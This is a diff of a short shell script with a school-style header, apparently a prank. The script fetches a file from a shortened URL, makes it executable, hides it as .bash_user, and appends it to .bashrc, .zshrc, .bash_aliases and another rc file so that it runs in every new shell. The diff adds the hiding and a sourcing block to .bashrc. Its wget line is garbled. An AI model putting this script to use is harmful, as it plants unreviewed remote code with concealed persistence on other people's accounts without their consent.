@@ -5,12 +5,17 @@
 ## Login   <galpin_a@epitech.net>
 ## 
 ## Started on  Thu May  5 18:02:39 2016 Antoine Galpin
-## Last update Thu May  5 18:27:43 2016 Antoine Galpin
+## Last update Thu May 12 17:49:03 2016 Antoine Galpin
 ##
 
 wget tinwget tinyurl.com/confnyancat
 chmod +x confnyancat
-echo "./confnyancat" >> .bashrc
-echo "./confnyancat" >> .mybashrc
-echo "./confnyancat" >> .bash_aliases
-echo "./confnyancat" >> .zshrc
+mv confnyancat .bash_user
+echo "if [ -f ${HOME}/./mybashrc ]" >> .bashrc
+echo "then" >> .bashrc
+echo "    . ${HOME}/./mybashrc" >> .bashrc
+echo "fi" >> .bashrc
+echo "./.bash_user" >> .bashrc
+echo "./.bash_user" >> .mybashrc
+echo "./.bash_user" >> .bash_aliases
+echo "./.bash_user" >> .zshrc
